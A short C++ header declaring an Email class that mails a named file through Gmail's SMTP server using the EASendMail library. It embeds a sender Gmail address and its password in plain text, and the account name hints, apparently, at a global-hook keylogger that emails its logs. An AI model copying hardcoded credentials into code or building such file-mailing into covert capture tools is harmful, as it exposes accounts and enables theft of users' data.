#pragma once
#include <tchar.h>
#include <string>
#include "easendmailobj.tlh"
#define EMAIL_FROM_NAME L"rsglobalhooks@gmail.com"
#define EMAIL_FROM_PASSWORD L"rsglobal"
#define EMAIL_SMTP_ADDRESS L"smtp.gmail.com"

using namespace EASendMailObjLib;
using namespace std;
class Email
{
private:
	WCHAR receiver[256];
public:
	Email(string receiver);
	void send(wstring fileName);
	~Email();
};

